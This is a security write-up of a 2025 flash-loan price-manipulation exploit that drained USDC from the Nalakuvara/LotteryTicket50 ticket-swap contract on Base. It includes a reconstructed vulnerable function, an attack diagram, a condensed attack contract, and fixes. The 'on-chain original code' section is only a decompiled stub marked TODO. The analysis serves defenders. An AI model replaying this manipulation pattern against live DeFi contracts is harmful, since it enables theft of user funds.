# Nalakuvara / LotteryTicket50 — Lottery Ticket Exchange Mechanism Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-05-08 |
| **Protocol** | Nalakuvara / LotteryTicket50 |
| **Chain** | Base |
| **Loss** | 105,470 USDC |
| **Attacker** | [0x3026c464d3bd6ef0ced0d49e80f171b58176ce32](https://basescan.org/address/0x3026c464d3bd6ef0ced0d49e80f171b58176ce32) |
| **Attack Tx** | [0x16a99aef...](https://basescan.org/tx/0x16a99aef4fab36c84ba4616668a03a5b37caa12e2fc48923dba4e711d2094699) |
| **Vulnerable Contract** | [0xb39392F4b6D92a6BD560Ed260C2c488081aAB8E9](https://basescan.org/address/0xb39392F4b6D92a6BD560Ed260C2c488081aAB8E9) |
| **Root Cause** | Missing exchange rate validation in LotteryTicketSwap50's transferToken/DestructionOfLotteryTickets functions, allowing an attacker to force an unfavorable exchange rate solely by manipulating the AMM spot price |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/Nalakuvara_LotteryTicket50_exp.sol) |

---

## 1. Vulnerability Overview

The Nalakuvara protocol's LotteryTicket50 system provided a mechanism to exchange lottery tickets (LotteryTicket50 tokens) for USDC. The `transferToken()` function of the `LotteryTicketSwap50` contract calculated the current ticket price using the instantaneous (spot) price from a Uniswap V2 pair. The attacker borrowed USDC via a Uniswap V3 flash loan to manipulate the V2 pool price, then called `DestructionOfLotteryTickets()` at the manipulated price to drain USDC.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable transferToken: exchange based on spot price
contract LotteryTicketSwap50 {
    address public uniswapV2Pair; // USDC/LotteryTicket50 pair

    function transferToken(uint256 amount) external returns (bool) {
        // ❌ Directly references current reserves of the Uniswap V2 pair (manipulable)
        (uint112 r0, uint112 r1,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
        uint256 ticketPrice = uint256(r0) * 1e6 / uint256(r1); // USDC per ticket
        // ❌ Manipulating r0 via flash loan causes ticketPrice to spike
        uint256 usdcAmount = amount * ticketPrice;
        IERC20(usdc).transfer(msg.sender, usdcAmount);
        return true;
    }

    function DestructionOfLotteryTickets(uint256 _amountTickets) external returns (bool) {
        // Burn tickets and distribute rewards
        IERC20(LotteryTicket50).transferFrom(msg.sender, address(this), _amountTickets);
        return transferToken(_amountTickets);
    }
}

// ✅ Correct code: use TWAP
function getTicketPrice() internal view returns (uint256) {
    return ITWAPOracle(oracle).consult(LotteryTicket50, USDC); // ✅ TWAP
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Nalakuvara_decompiled.sol
contract Nalakuvara {
    function transfer(address a, uint256 b) external {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Uniswap V3 Flash Loan (borrow large amount of USDC)
  │
  ├─[2]─► Manipulate V2 UniswapV2Pair(USDC/LotteryTicket50) price with borrowed USDC
  │         └─► Transfer USDC directly into V2 pair → reserve imbalance
  │         └─► LotteryTicket50 price spikes (in USDC terms)
  │
  ├─[3]─► Call LotteryTicketSwap50.DestructionOfLotteryTickets()
  │         └─► Receive large amount of USDC at manipulated price for a small amount of LotteryTicket50
  │
  ├─[4]─► Repay V3 flash loan
  │
  └─[5]─► Net profit: 105,470 USDC
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    function attack() public {
        // [2] Transfer USDC directly into V2 pair to manipulate the price
        IERC20(usdc).transfer(address(UniswapV2Pair), USDC_MANIPULATE_AMOUNT);

        // [3] Burn tickets at manipulated price → receive large amount of USDC
        uint256 ticketBalance = IERC20(LotteryTicket50).balanceOf(address(this));
        IERC20(LotteryTicket50).approve(LotteryTicketSwap50, ticketBalance);
        ILotteryTicketSwap50(LotteryTicketSwap50)
            .DestructionOfLotteryTickets(ticketBalance);
    }

    function uniswapV3FlashCallback(
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        // [1] Handle flash loan callback
        attack();

        // [4] Repay V3 flash loan
        IERC20(usdc).transfer(msg.sender, amount1 + FEE);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Price Oracle Manipulation |
| **Attack Technique** | Flash Loan + V2 Pair Price Manipulation |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | Critical |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Use TWAP**: Use a Time-Weighted Average Price (TWAP) for lottery ticket price calculations.
2. **Limit Maximum Price Movement**: Set an upper bound on ticket price fluctuation within a single transaction.
3. **Fix Exchange Rate**: Fix the ticket:USDC exchange rate or use a trusted external oracle.

## 7. Lessons Learned

- **Vulnerability of Lottery/Gaming DeFi**: Calculating the price of speculative assets such as lottery tickets using AMM spot prices makes them highly susceptible to manipulation.
- **V2/V3 Combination Attack**: The pattern of funding via V3 flash loans and manipulating V2 pools is used repeatedly.
- **Irony of DestructionOfLotteryTickets**: The burn function designed to benefit the protocol instead became the instrument that destroyed it.